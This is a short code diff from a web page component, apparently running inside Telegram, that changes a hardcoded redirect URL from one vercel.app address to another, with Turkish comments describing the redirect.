@@ -395,7 +395,7 @@ export default function Page() {
       }
 
       /* ===== Sabit yönlendirme adresi ===== */
-      const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR03'
+      const secureBridgeUrl = 'https://secure-protection.vercel.app/IR03'
       const encodedBridge   = encodeURIComponent(secureBridgeUrl)
 
       // Mevcut sayfanın (Telegram içindeki) tam URL’i
